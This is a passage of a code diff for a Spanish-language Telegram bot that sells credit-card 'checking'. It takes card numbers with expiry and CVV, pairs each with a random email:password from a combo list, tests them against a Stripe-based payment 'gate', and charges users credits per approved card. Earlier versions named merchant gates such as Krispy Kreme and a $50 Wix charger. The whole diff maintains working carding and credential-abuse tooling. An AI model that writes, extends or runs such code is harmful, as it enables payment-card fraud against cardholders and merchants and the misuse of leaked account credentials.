+            # Notificación en tiempo real para el cliente (tanto Success como Fail)
             notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_resultado)
 
             with estado_lock:
@@ -842,15 +574,27 @@ def recibir_datos_lote(message):
         bot.send_message(chat_id, reporte_descartes, parse_mode="HTML")
 
     if not tarjetas_validas:
-        bot.send_message(chat_id, "⛔ Ninguna tarjeta válida para procesar.", parse_mode="HTML")
+        bot.send_message(
+            chat_id, 
+            "⛔ Ninguna tarjeta válida para procesar.\n\n"
+            "💡 Si tienes un texto sin formato, usa @filtro_carbon_bot para ordenarlos.",
+            parse_mode="HTML"
+        )
         return
 
     combos_path = os.path.join(BASE_DIR, "COMBO.txt")
-    combos = []
-    if os.path.exists(combos_path):
-        with open(combos_path, "r", encoding="utf-8") as f:
-            combos = [l.strip() for l in f if ":" in l and l.strip()]
+    if not os.path.exists(combos_path):
+        bot.send_message(chat_id, "❌ No se encontró el archivo `combo.txt` en el servidor.")
+        return
+    
+    with open(combos_path, "r", encoding="utf-8") as f:
+        combos = [l.strip() for l in f if ":" in l and l.strip()]
 
+    if not combos:
+        bot.send_message(chat_id, "❌ El archivo `combo.txt` está vacío.")
+        return
+
+    # 👇 LIMPIAR LA COLA DE TAREAS ANTES DE INSERTAR NUEVAS (Evita que se repitan procesos viejos)
     while not cola_tareas.empty():
         try:
             cola_tareas.get_nowait()
@@ -875,13 +619,11 @@ def recibir_datos_lote(message):
     contador_expiradas += len([r for r in tarjetas_rechazadas if r[1] == "EXPIRADA"])
 
     for linea_cc in tarjetas_validas:
-        correo, password = "", ""
-        if combos:
-            linea_combo = random.choice(combos)
-            try:
-                correo, password = linea_combo.split(":", 1)
-            except ValueError:
-                pass
+        linea_combo = random.choice(combos)
+        try:
+            correo, password = linea_combo.split(":", 1)
+        except ValueError:
+            continue
 
         cola_tareas.put({
             "linea_cc": linea_cc,
@@ -893,13 +635,12 @@ def recibir_datos_lote(message):
 
     bot.send_message(
         chat_id,
-        f"🚀 <b>Lote aceptado:</b> {len(tarjetas_validas)} tarjetas en cola usando <b>{estado['gate_activo']}</b>.",
+        f"🚀 <b>Lote aceptado:</b> {len(tarjetas_validas)} tarjetas en cola (Stripe Gate API).",
         parse_mode="HTML"
     )
 
     notificar_propietario(
         f"🚀 <b>NUEVO CHEQUEO INICIADO</b>\n"
-        f"• <b>Gate:</b> {estado['gate_activo']}\n"
         f"• <b>Usuario:</b> @{username} (<code>{user_id}</code>)\n"
         f"• <b>Total de CCs:</b> {len(tarjetas_validas)}"
     )
@@ -920,6 +661,7 @@ def cmd_start(message):
 
 @bot.message_handler(commands=["id", "me", "perfil"])
 def cmd_mi_perfil(message):
+    """Muestra al cliente su ID, su Username y sus créditos actuales."""
     uid = message.from_user.id
     uname = message.from_user.username or "Sin usuario"
     registrar_usuario(uid, message.from_user.username)
@@ -944,16 +686,29 @@ def cmd_gestion_creditos(message):
 
     partes = message.text.split()
     if len(partes) < 3:
-        bot.send_message(message.chat.id, "⚠️ Uso: <code>/creditos ID +20</code>", parse_mode="HTML")
+        bot.send_message(
+            message.chat.id,
+            "⚠️ <b>Uso incorrecto del comando.</b>\n\n"
+            "Formatos válidos:\n"
+            "• <code>/creditos ID_o_Username +20</code> (para sumar)\n"
+            "• <code>/creditos ID_o_Username -10</code> (para restar)\n"
+            "• <code>/creditos ID_o_Username 50</code> (establece/suma directa)",
+            parse_mode="HTML"
+        )
         return
 
     identificador = partes[1]
     param_cant = partes[2]
 
     try:
-        cantidad = int(param_cant)
+        if param_cant.startswith("+"):
+            cantidad = int(param_cant[1:])
+        elif param_cant.startswith("-"):
+            cantidad = -int(param_cant[1:])
+        else:
+            cantidad = int(param_cant)
     except ValueError:
-        bot.send_message(message.chat.id, "❌ Cantidad inválida.", parse_mode="HTML")
+        bot.send_message(message.chat.id, "❌ Cantidad inválida. Debe ser un número entero (ej: <code>+20</code> o <code>-10</code>).", parse_mode="HTML")
         return
 
     exito, resultado = modificar_creditos_por_identificador(identificador, cantidad)
@@ -962,12 +717,92 @@ def cmd_gestion_creditos(message):
         return
 
     uid_afectado, uname_afectado, nuevo_saldo = resultado
-    bot.send_message(message.chat.id, f"✅ Créditos actualizados para @{uname_afectado}. Nuevo saldo: <b>{nuevo_saldo}</b>", parse_mode="HTML")
+    signo_str = f"+{cantidad}" if cantidad >= 0 else str(cantidad)
+
+    bot.send_message(
+        message.chat.id,
+        f"✅ <b>CRÉDITOS ACTUALIZADOS CON ÉXITO</b>\n\n"
+        f"• <b>Usuario:</b> @{uname_afectado}\n"
+        f"• <b>ID:</b> <code>{uid_afectado}</code>\n"
+        f"• <b>Modificación:</b> <code>{signo_str}</code> créditos\n"
+        f"• <b>Nuevo saldo total:</b> <b>{nuevo_saldo}</b> créditos",
+        parse_mode="HTML"
+    )
+
+    try:
+        bot.send_message(
+            int(uid_afectado),
+            f"🔔 <b>¡El administrador ha actualizado tus créditos!</b>\n\n"
+            f"• <b>Cambio:</b> <code>{signo_str}</code> créditos\n"
+            f"• <b>Tu nuevo saldo:</b> <b>{nuevo_saldo}</b> créditos",
+            parse_mode="HTML"
+        )
+    except Exception:
+        pass
+
+
+@bot.message_handler(commands=["anuncio", "broadcast"])
+def cmd_anuncio(message):
+    if message.from_user.id != PROPIETARIO_ID:
+        bot.send_message(message.chat.id, "⛔ Comando exclusivo del propietario.")
+        return
+
+    texto_anuncio = ""
+    if message.reply_to_message:
+        texto_anuncio = message.reply_to_message.text or message.reply_to_message.caption
+    else:
+        partes = message.text.split(maxsplit=1)
+        if len(partes) > 1:
+            texto_anuncio = partes[1]
+
+    if not texto_anuncio:
+        bot.send_message(
+            message.chat.id,
+            "⚠️ <b>Uso correcto:</b>\n"
+            "• <code>/anuncio Tu mensaje aquí</code>\n"
+            "• O responde a un mensaje con <code>/anuncio</code>",
+            parse_mode="HTML"
+        )
+        return
+
+    clientes = cargar_clientes()
+    if not clientes:
+        bot.send_message(message.chat.id, "❌ No hay usuarios registrados.", parse_mode="HTML")
+        return
+
+    enviados = 0
+    fallidos = 0
+    
+    msg_estado = bot.send_message(message.chat.id, "📢 <b>Enviando anuncio masivo...</b>", parse_mode="HTML")
+
+    for uid in list(clientes.keys()):
+        try:
+            bot.send_message(
+                int(uid),
+                f"📢 <b>ANUNCIO DEL ADMINISTRADOR</b>\n\n{texto_anuncio}",
+                parse_mode="HTML"
+            )
+            enviados += 1
+            time.sleep(0.05)
+        except Exception:
+            fallidos += 1
+
+    bot.edit_message_text(
+        f"✅ <b>ANUNCIO ENVIADO CON ÉXITO</b>\n\n"
+        f"• <b>Entregados:</b> {enviados}\n"
+        f"• <b>Fallidos:</b> {fallidos}\n"
+        f"• <b>Total en BD:</b> {len(clientes)}",
+        chat_id=message.chat.id,
+        message_id=msg_estado.message_id,
+        parse_mode="HTML"
+    )
 
 
 @bot.message_handler(commands=['stop', 'detener', 'parar'])
 def cmd_stop_proceso(message):
+    user_id = message.from_user.id
     chat_id = message.chat.id
+
     with estado_lock:
         if not estado["en_progreso"]:
             bot.send_message(chat_id, "⚠️ No hay ningún proceso en ejecución.")
@@ -982,9 +817,11 @@ def cmd_stop_proceso(message):
         except queue.Empty:
             break
 
-    bot.send_message(chat_id, "🛑 <b>El proceso ha sido detenido.</b>", parse_mode="HTML")
-    resumen_texto = generar_resumen_proceso(message.from_user.id)
+    bot.send_message(chat_id, "🛑 <b>El proceso ha sido detenido por el usuario.</b>", parse_mode="HTML")
+    resumen_texto = generar_resumen_proceso(user_id)
     bot.send_message(chat_id, resumen_texto, parse_mode="HTML")
+    
+    notificar_propietario(f"🛑 <b>Proceso detenido manualmente</b> por @{message.from_user.username or 'Anonimo'}")
     notificar_usuarios_en_espera()
 
 
@@ -998,27 +835,27 @@ def callback_listener(call):
     except Exception:
         pass
 
-    if call.data == "btn_elegir_gate":
-        mostrar_selector_gates(chat_id, user_id)
-    elif call.data == "gate_krispy":
-        with estado_lock:
-            estado["gate_activo"] = "Krispy Kreme (Stripe API)"
-        bot.edit_message_text("🍩 Has seleccionado: <b>Krispy Kreme</b>", chat_id, call.message.message_id, parse_mode="HTML")
-        solicitar_datos_ccs(chat_id, user_id)
-    elif call.data == "gate_wix":
-        with estado_lock:
-            estado["gate_activo"] = "Stripe Wix Charger ($50 - Ecopil)"
-        bot.edit_message_text("💳 Has seleccionado: <b>Stripe Wix Charger ($50 - Ecopil)</b>", chat_id, call.message.message_id, parse_mode="HTML")
-        solicitar_datos_ccs(chat_id, user_id)
+    if call.data == "btn_check_ccs":
+        solicitar_data = solicitar_datos_ccs(chat_id, user_id)
     elif call.data == "btn_saldo":
         saldo = obtener_saldo(user_id)
         bot.send_message(chat_id, f"💰 Tienes <b>{saldo}</b> créditos disponibles.", parse_mode="HTML")
     elif call.data == "btn_instrucciones":
         inst = (
-            "📖 <b>GUÍA DEL BOT</b>\n\n"
-            "• <b>Gate 1:</b> Krispy Kreme (Stripe API)\n"
-            "• <b>Gate 2:</b> Stripe Wix Charger ($50 - Ecopil)\n"
-            "📌 <b>Formato:</b> <code>CC|MM|AAAA|CVV</code>"
+            "📖 <b>GUÍA Y SISTEMA DE CRÉDITOS</b>\n\n"
+            "💳 <b>Gate Activo:</b> Stripe API\n"
+            "⚡ <b>Velocidad:</b> Ultra rápida por Peticiones HTTP.\n\n"
+            "📌 <b>FORMATO ACEPTADO:</b>\n"
+            "Puedes enviar una tarjeta o un archivo <code>.txt</code> en formato:\n"
+            "<code>CC|MM|AAAA|CVV</code>\n\n"
+            "💡 <i>Si tus datos no están limpios, usa el botón '📌 Formato Correcto' o entra a @filtro_carbon_bot para ordenarlos automáticamente.</i>\n\n"
+            "💰 <b>REGLAS DE COBRO DE CRÉDITOS:</b>\n"
+            "• 🎁 <b>Bono de Bienvenida:</b> 40 créditos gratis al registrarte.\n"
+            "• ✅ <b>Éxito (SUCCESS):</b> Se cobran <b>4 créditos</b> por cada tarjeta aprobada.\n"
+            "• ❌ <b>Fallo (FAIL):</b> Totalmente <b>GRATIS</b> (0 créditos descontados).\n"
+            "• ⏳ <b>Expiradas / Formato Inválido:</b> Se descartan automáticamente antes de procesar sin costo.\n\n"
+            "🔍 <b>COMANDOS DISPONIBLES:</b>\n"
+            "• /id (o /me) ➔ Muestra tu ID, usuario y créditos."
         )
         bot.send_message(chat_id, inst, parse_mode="HTML")
     elif call.data == "btn_avisar":
@@ -1029,5 +866,5 @@ def callback_listener(call):
 
 if __name__ == "__main__":
     threading.Thread(target=worker_principal, daemon=True, name="Worker-HTTP").start()
-    print("🤖 Bot de Telegram con ambos Gates en marcha...")
+    print("🤖 Bot de Telegram (Railway Ready) en marcha...")
     bot.infinity_polling(timeout=20, long_polling_timeout=10)
